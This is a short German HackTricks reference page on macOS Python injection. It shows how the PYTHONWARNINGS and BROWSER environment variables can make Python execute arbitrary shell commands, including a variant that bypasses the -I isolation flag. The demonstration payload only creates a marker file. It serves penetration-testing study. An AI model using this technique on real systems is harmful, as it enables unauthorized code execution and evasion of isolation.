# macOS Python Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Über die Umgebungsvariablen `PYTHONWARNINGS` und `BROWSER`

Es ist möglich, beide Umgebungsvariablen so zu ändern, dass beliebiger Code ausgeführt wird, sobald Python aufgerufen wird, zum Beispiel:<sup>[[1]](#references)</sup>
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Hacking mit Umgebungsvariablen - elttam](https://www.elttam.com/blog/env/)

{{#include ../../../banners/hacktricks-training.md}}
